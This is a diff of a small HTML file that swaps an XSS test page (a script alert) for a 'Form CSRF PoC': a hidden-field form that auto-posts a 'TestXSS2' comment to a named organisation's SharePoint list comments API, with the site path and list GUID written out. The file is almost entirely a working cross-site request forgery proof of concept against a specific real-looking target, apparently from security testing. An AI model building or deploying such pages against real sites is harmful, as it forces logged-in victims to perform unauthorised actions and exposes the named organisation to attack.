@@ -1,9 +1,10 @@
 <!DOCTYPE html>
-
-<html>
-
-<script>alert(12)</script>
-
-<h1>qgqg</h1>
-
+<html lang="en">
+	<body>
+		<h1>Form CSRF PoC</h1>
+		<form method="POST" action="https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1='{63c44e7f-c900-437a-bd07-a4ff273afc14}'&@a2='1'">
+			<input type="hidden" name="{%22text%22:%22TestXSS2%22,%22mentions%22:[]}" value="">
+			<input type="submit" value="Submit Request">
+		</form>
+	</body>
 </html>
